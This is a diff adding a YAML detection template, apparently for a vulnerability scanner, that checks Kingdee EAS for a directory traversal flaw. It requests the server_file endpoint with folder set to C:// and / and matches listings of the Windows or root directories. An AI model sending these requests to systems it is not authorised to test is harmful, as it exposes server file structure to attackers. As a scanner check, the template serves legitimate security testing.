@@ -1,0 +1,31 @@
+id: kingdee-eas-directory-traversal
+name: Kingdee EAS - Local File Inclusion
+severity: high
+confidence: tentative
+description: Kingdee EAS OA server_file is vulnerable to local file inclusion and can allow attackers to obtain sensitive
+  server information.
+reference: CWE-22
+tags:
+- kingdee
+- lfi
+- traversal
+- vuln
+requests:
+- method: GET
+  path: /appmonitor/protected/selector/server_file/files?folder=C://&suffix=
+  matchers: &id001
+  - type: body
+    words:
+    - '{"name":"Windows","path":"C:\\\\Windows","folder":true}'
+    - '{"name":"root","path":"/root","folder":true}'
+  - type: header
+    words:
+    - application/json
+  - type: status
+    status:
+    - 200
+  condition: and
+- method: GET
+  path: /appmonitor/protected/selector/server_file/files?folder=/&suffix=
+  matchers: *id001
+  condition: and
